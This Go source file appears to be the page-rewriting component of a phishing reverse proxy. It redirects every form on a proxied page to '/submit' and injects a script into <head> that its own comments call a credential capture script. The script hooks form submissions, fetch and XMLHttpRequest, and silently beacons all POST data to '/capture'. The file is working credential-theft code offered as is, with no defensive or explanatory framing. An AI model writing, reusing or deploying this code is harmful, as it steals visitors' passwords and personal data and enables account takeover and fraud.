package rewriter

import (
	"bytes"
	"fmt"
	"strings"

	"golang.org/x/net/html"
)

// captureScript is injected as the first child of <head> so our fetch/XHR/submit
// hooks are in place before any site JavaScript runs.
const captureScript = `(function(){
  function beacon(obj){
    try{
      var p=new URLSearchParams();
      for(var k in obj){if(obj.hasOwnProperty(k))p.append(k,obj[k]);}
      if(navigator.sendBeacon){navigator.sendBeacon('/capture',p);}
      else{fetch('/capture',{method:'POST',body:p,keepalive:true});}
    }catch(e){}
  }
  document.addEventListener('submit',function(e){
    try{var fd=new FormData(e.target),o={};fd.forEach(function(v,k){o[k]=v;});beacon(o);}catch(e){}
  },true);
  var _f=window.fetch;
  window.fetch=function(url,opts){
    try{
      if(opts&&/post/i.test(opts.method||'')&&opts.body){
        var b=opts.body,o={};
        if(b instanceof URLSearchParams){b.forEach(function(v,k){o[k]=v;});}
        else if(typeof b==='string'){
          try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
          catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
        }
        if(Object.keys(o).length)beacon(o);
      }
    }catch(e){}
    return _f.apply(this,arguments);
  };
  var _o=XMLHttpRequest.prototype.open,_s=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m){this._csm=m;return _o.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){
    try{
      if(/post/i.test(this._csm||'')&&b){
        var o={};
        if(typeof b==='string'){
          try{var j=JSON.parse(b);if(j&&typeof j==='object')o=j;}
          catch(_){new URLSearchParams(b).forEach(function(v,k){o[k]=v;});}
        }
        if(Object.keys(o).length)beacon(o);
      }
    }catch(e){}
    return _s.apply(this,arguments);
  };
})();`

// RewriteForms parses HTML, rewrites all <form> action attributes to "/submit",
// injects the credential capture script into <head>, then renders the document.
func RewriteForms(htmlContent string) (string, error) {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		return "", fmt.Errorf("parse HTML: %w", err)
	}

	rewriteNode(doc)
	injectCaptureScript(doc)

	var buf bytes.Buffer
	if err := html.Render(&buf, doc); err != nil {
		return "", fmt.Errorf("render HTML: %w", err)
	}
	return buf.String(), nil
}

// injectCaptureScript prepends the capture script as the first child of <head>.
func injectCaptureScript(doc *html.Node) {
	var head *html.Node
	var find func(*html.Node)
	find = func(n *html.Node) {
		if n.Type == html.ElementNode && n.Data == "head" {
			head = n
			return
		}
		for c := n.FirstChild; c != nil && head == nil; c = c.NextSibling {
			find(c)
		}
	}
	find(doc)
	if head == nil {
		return
	}

	script := &html.Node{Type: html.ElementNode, Data: "script"}
	script.AppendChild(&html.Node{Type: html.TextNode, Data: captureScript})
	head.InsertBefore(script, head.FirstChild)
}

func rewriteNode(n *html.Node) {
	if n.Type == html.ElementNode && n.Data == "form" {
		hasAction := false
		for i, a := range n.Attr {
			if strings.ToLower(a.Key) == "action" {
				n.Attr[i].Val = "/submit"
				hasAction = true
			}
		}
		if !hasAction {
			n.Attr = append(n.Attr, html.Attribute{Key: "action", Val: "/submit"})
		}
	}
	for c := n.FirstChild; c != nil; c = c.NextSibling {
		rewriteNode(c)
	}
}
